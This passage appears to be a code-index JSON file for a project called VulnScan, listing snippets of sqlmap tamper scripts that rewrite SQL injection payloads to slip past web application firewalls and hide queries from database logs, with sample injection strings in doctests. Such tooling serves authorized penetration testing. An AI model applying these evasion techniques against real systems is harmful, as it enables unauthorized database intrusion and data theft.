        "detail": "VulnScan.modules.sqlmap.tamper.multiplespaces",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.multiplespaces",
        "description": "VulnScan.modules.sqlmap.tamper.multiplespaces",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Adds multiple spaces (' ') around SQL keywords\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that has poorly written permissive regular expressions\n    Reference: https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt",
        "detail": "VulnScan.modules.sqlmap.tamper.multiplespaces",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.ord2ascii",
        "description": "VulnScan.modules.sqlmap.tamper.ord2ascii",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces ORD() occurences with equivalent ASCII() calls \n    Requirement:\n        * MySQL\n    >>> tamper(\"ORD('42')\")\n    \"ASCII('42')\"\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.tamper.ord2ascii",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.ord2ascii",
        "description": "VulnScan.modules.sqlmap.tamper.ord2ascii",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces ORD() occurences with equivalent ASCII() calls \n    Requirement:\n        * MySQL\n    >>> tamper(\"ORD('42')\")\n    \"ASCII('42')\"\n    \"\"\"\n    retVal = payload\n    if payload:",
        "detail": "VulnScan.modules.sqlmap.tamper.ord2ascii",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.ord2ascii",
        "description": "VulnScan.modules.sqlmap.tamper.ord2ascii",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces ORD() occurences with equivalent ASCII() calls \n    Requirement:\n        * MySQL\n    >>> tamper(\"ORD('42')\")\n    \"ASCII('42')\"",
        "detail": "VulnScan.modules.sqlmap.tamper.ord2ascii",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.overlongutf8",
        "description": "VulnScan.modules.sqlmap.tamper.overlongutf8",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)\n    Reference:\n        * https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/\n        * https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/\n    >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')\n    'SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1'",
        "detail": "VulnScan.modules.sqlmap.tamper.overlongutf8",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.overlongutf8",
        "description": "VulnScan.modules.sqlmap.tamper.overlongutf8",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)\n    Reference:\n        * https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/\n        * https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/\n    >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')\n    'SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1'\n    \"\"\"\n    retVal = payload",
        "detail": "VulnScan.modules.sqlmap.tamper.overlongutf8",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.overlongutf8",
        "description": "VulnScan.modules.sqlmap.tamper.overlongutf8",
        "peekOfCode": "__priority__ = PRIORITY.LOWEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)\n    Reference:\n        * https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/\n        * https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/\n    >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')",
        "detail": "VulnScan.modules.sqlmap.tamper.overlongutf8",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.overlongutf8more",
        "description": "VulnScan.modules.sqlmap.tamper.overlongutf8more",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)\n    Reference:\n        * https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/\n        * https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/\n    >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')\n    '%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1'",
        "detail": "VulnScan.modules.sqlmap.tamper.overlongutf8more",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.overlongutf8more",
        "description": "VulnScan.modules.sqlmap.tamper.overlongutf8more",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)\n    Reference:\n        * https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/\n        * https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/\n    >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')\n    '%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1'\n    \"\"\"\n    retVal = payload",
        "detail": "VulnScan.modules.sqlmap.tamper.overlongutf8more",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.overlongutf8more",
        "description": "VulnScan.modules.sqlmap.tamper.overlongutf8more",
        "peekOfCode": "__priority__ = PRIORITY.LOWEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)\n    Reference:\n        * https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/\n        * https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/\n    >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')",
        "detail": "VulnScan.modules.sqlmap.tamper.overlongutf8more",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.percentage",
        "description": "VulnScan.modules.sqlmap.tamper.percentage",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against ASP web applications\" % os.path.basename(__file__).split(\".\")[0])\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Adds a percentage sign ('%') infront of each character (e.g. SELECT -> %S%E%L%E%C%T)\n    Requirement:\n        * ASP\n    Tested against:\n        * Microsoft SQL Server 2000, 2005\n        * MySQL 5.1.56, 5.5.11",
        "detail": "VulnScan.modules.sqlmap.tamper.percentage",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.percentage",
        "description": "VulnScan.modules.sqlmap.tamper.percentage",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Adds a percentage sign ('%') infront of each character (e.g. SELECT -> %S%E%L%E%C%T)\n    Requirement:\n        * ASP\n    Tested against:\n        * Microsoft SQL Server 2000, 2005\n        * MySQL 5.1.56, 5.5.11\n        * PostgreSQL 9.0\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.percentage",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.percentage",
        "description": "VulnScan.modules.sqlmap.tamper.percentage",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against ASP web applications\" % os.path.basename(__file__).split(\".\")[0])\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Adds a percentage sign ('%') infront of each character (e.g. SELECT -> %S%E%L%E%C%T)\n    Requirement:\n        * ASP\n    Tested against:\n        * Microsoft SQL Server 2000, 2005",
        "detail": "VulnScan.modules.sqlmap.tamper.percentage",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.plus2concat",
        "description": "VulnScan.modules.sqlmap.tamper.plus2concat",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MSSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart\n    Tested against:\n        * Microsoft SQL Server 2012\n    Requirements:\n        * Microsoft SQL Server 2012+\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.plus2concat",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.plus2concat",
        "description": "VulnScan.modules.sqlmap.tamper.plus2concat",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart\n    Tested against:\n        * Microsoft SQL Server 2012\n    Requirements:\n        * Microsoft SQL Server 2012+\n    Notes:\n        * Useful in case ('+') character is filtered\n    >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')",
        "detail": "VulnScan.modules.sqlmap.tamper.plus2concat",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.plus2concat",
        "description": "VulnScan.modules.sqlmap.tamper.plus2concat",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MSSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart\n    Tested against:\n        * Microsoft SQL Server 2012\n    Requirements:\n        * Microsoft SQL Server 2012+",
        "detail": "VulnScan.modules.sqlmap.tamper.plus2concat",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.plus2fnconcat",
        "description": "VulnScan.modules.sqlmap.tamper.plus2fnconcat",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MSSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart\n    Tested against:\n        * Microsoft SQL Server 2008\n    Requirements:\n        * Microsoft SQL Server 2008+\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.plus2fnconcat",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.plus2fnconcat",
        "description": "VulnScan.modules.sqlmap.tamper.plus2fnconcat",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart\n    Tested against:\n        * Microsoft SQL Server 2008\n    Requirements:\n        * Microsoft SQL Server 2008+\n    Notes:\n        * Useful in case ('+') character is filtered\n        * https://msdn.microsoft.com/en-us/library/bb630290.aspx",
        "detail": "VulnScan.modules.sqlmap.tamper.plus2fnconcat",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.plus2fnconcat",
        "description": "VulnScan.modules.sqlmap.tamper.plus2fnconcat",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MSSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart\n    Tested against:\n        * Microsoft SQL Server 2008\n    Requirements:\n        * Microsoft SQL Server 2008+",
        "detail": "VulnScan.modules.sqlmap.tamper.plus2fnconcat",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.randomcase",
        "description": "VulnScan.modules.sqlmap.tamper.randomcase",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0",
        "detail": "VulnScan.modules.sqlmap.tamper.randomcase",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.randomcase",
        "description": "VulnScan.modules.sqlmap.tamper.randomcase",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n        * SQLite 3\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.randomcase",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.randomcase",
        "description": "VulnScan.modules.sqlmap.tamper.randomcase",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g",
        "detail": "VulnScan.modules.sqlmap.tamper.randomcase",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.randomcomments",
        "description": "VulnScan.modules.sqlmap.tamper.randomcomments",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)\n    >>> import random\n    >>> random.seed(0)\n    >>> tamper('INSERT')\n    'I/**/NS/**/ERT'\n    \"\"\"\n    retVal = payload\n    if payload:",
        "detail": "VulnScan.modules.sqlmap.tamper.randomcomments",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.randomcomments",
        "description": "VulnScan.modules.sqlmap.tamper.randomcomments",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)\n    >>> import random\n    >>> random.seed(0)\n    >>> tamper('INSERT')\n    'I/**/NS/**/ERT'\n    \"\"\"\n    retVal = payload",
        "detail": "VulnScan.modules.sqlmap.tamper.randomcomments",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.schemasplit",
        "description": "VulnScan.modules.sqlmap.tamper.schemasplit",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Splits FROM schema identifiers (e.g. 'testdb.users') with whitespace (e.g. 'testdb 9.e.users')\n    Requirement:\n        * MySQL\n    Notes:\n        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf\n    >>> tamper('SELECT id FROM testdb.users')",
        "detail": "VulnScan.modules.sqlmap.tamper.schemasplit",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.schemasplit",
        "description": "VulnScan.modules.sqlmap.tamper.schemasplit",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Splits FROM schema identifiers (e.g. 'testdb.users') with whitespace (e.g. 'testdb 9.e.users')\n    Requirement:\n        * MySQL\n    Notes:\n        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf\n    >>> tamper('SELECT id FROM testdb.users')\n    'SELECT id FROM testdb 9.e.users'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.tamper.schemasplit",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.schemasplit",
        "description": "VulnScan.modules.sqlmap.tamper.schemasplit",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Splits FROM schema identifiers (e.g. 'testdb.users') with whitespace (e.g. 'testdb 9.e.users')\n    Requirement:\n        * MySQL\n    Notes:\n        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf",
        "detail": "VulnScan.modules.sqlmap.tamper.schemasplit",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.scientific",
        "description": "VulnScan.modules.sqlmap.tamper.scientific",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Abuses MySQL scientific notation\n    Requirement:\n        * MySQL\n    Notes:\n        * Reference: https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/\n    >>> tamper('1 AND ORD(MID((CURRENT_USER()),7,1))>1')",
        "detail": "VulnScan.modules.sqlmap.tamper.scientific",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.scientific",
        "description": "VulnScan.modules.sqlmap.tamper.scientific",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Abuses MySQL scientific notation\n    Requirement:\n        * MySQL\n    Notes:\n        * Reference: https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/\n    >>> tamper('1 AND ORD(MID((CURRENT_USER()),7,1))>1')\n    '1 AND ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.tamper.scientific",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.scientific",
        "description": "VulnScan.modules.sqlmap.tamper.scientific",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Abuses MySQL scientific notation\n    Requirement:\n        * MySQL\n    Notes:\n        * Reference: https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/",
        "detail": "VulnScan.modules.sqlmap.tamper.scientific",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.sleep2getlock",
        "description": "VulnScan.modules.sqlmap.tamper.sleep2getlock",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'SLEEP(5)' with (e.g.) \"GET_LOCK('ETgP',5)\"\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0 and 5.5\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.sleep2getlock",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.sleep2getlock",
        "description": "VulnScan.modules.sqlmap.tamper.sleep2getlock",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'SLEEP(5)' with (e.g.) \"GET_LOCK('ETgP',5)\"\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0 and 5.5\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that filter the SLEEP() and BENCHMARK() functions",
        "detail": "VulnScan.modules.sqlmap.tamper.sleep2getlock",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.sleep2getlock",
        "description": "VulnScan.modules.sqlmap.tamper.sleep2getlock",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'SLEEP(5)' with (e.g.) \"GET_LOCK('ETgP',5)\"\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0 and 5.5",
        "detail": "VulnScan.modules.sqlmap.tamper.sleep2getlock",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.sp_password",
        "description": "VulnScan.modules.sqlmap.tamper.sp_password",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Appends (MsSQL) function 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs\n    Requirement:\n        * MSSQL\n    Notes:\n        * Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure\n        * Reference: http://websec.ca/kb/sql_injection\n    >>> tamper('1 AND 9227=9227-- ')\n    '1 AND 9227=9227-- sp_password'",
        "detail": "VulnScan.modules.sqlmap.tamper.sp_password",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.sp_password",
        "description": "VulnScan.modules.sqlmap.tamper.sp_password",
        "peekOfCode": "__priority__ = PRIORITY.HIGH\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Appends (MsSQL) function 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs\n    Requirement:\n        * MSSQL\n    Notes:\n        * Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure\n        * Reference: http://websec.ca/kb/sql_injection\n    >>> tamper('1 AND 9227=9227-- ')",
        "detail": "VulnScan.modules.sqlmap.tamper.sp_password",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2comment",
        "description": "VulnScan.modules.sqlmap.tamper.space2comment",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with comments '/**/'\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0",
        "detail": "VulnScan.modules.sqlmap.tamper.space2comment",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2comment",
        "description": "VulnScan.modules.sqlmap.tamper.space2comment",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with comments '/**/'\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls",
        "detail": "VulnScan.modules.sqlmap.tamper.space2comment",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2comment",
        "description": "VulnScan.modules.sqlmap.tamper.space2comment",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with comments '/**/'\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g",
        "detail": "VulnScan.modules.sqlmap.tamper.space2comment",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2dash",
        "description": "VulnScan.modules.sqlmap.tamper.space2dash",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\\n')\n    Requirement:\n        * MSSQL\n        * SQLite\n    Notes:\n        * Useful to bypass several web application firewalls\n        * Used during the ZeroNights SQL injection challenge,\n          https://proton.onsec.ru/contest/",
        "detail": "VulnScan.modules.sqlmap.tamper.space2dash",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2dash",
        "description": "VulnScan.modules.sqlmap.tamper.space2dash",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\\n')\n    Requirement:\n        * MSSQL\n        * SQLite\n    Notes:\n        * Useful to bypass several web application firewalls\n        * Used during the ZeroNights SQL injection challenge,",
        "detail": "VulnScan.modules.sqlmap.tamper.space2dash",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2hash",
        "description": "VulnScan.modules.sqlmap.tamper.space2hash",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n')\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 4.0, 5.0\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.space2hash",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2hash",
        "description": "VulnScan.modules.sqlmap.tamper.space2hash",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n')\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 4.0, 5.0\n    Notes:\n        * Useful to bypass several web application firewalls\n        * Used during the ModSecurity SQL injection challenge,",
        "detail": "VulnScan.modules.sqlmap.tamper.space2hash",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2hash",
        "description": "VulnScan.modules.sqlmap.tamper.space2hash",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n')\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 4.0, 5.0",
        "detail": "VulnScan.modules.sqlmap.tamper.space2hash",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2morecomment",
        "description": "VulnScan.modules.sqlmap.tamper.space2morecomment",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with comments '/**_**/'\n    Tested against:\n        * MySQL 5.0 and 5.5\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls\n    >>> tamper('SELECT id FROM users')",
        "detail": "VulnScan.modules.sqlmap.tamper.space2morecomment",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2morecomment",
        "description": "VulnScan.modules.sqlmap.tamper.space2morecomment",
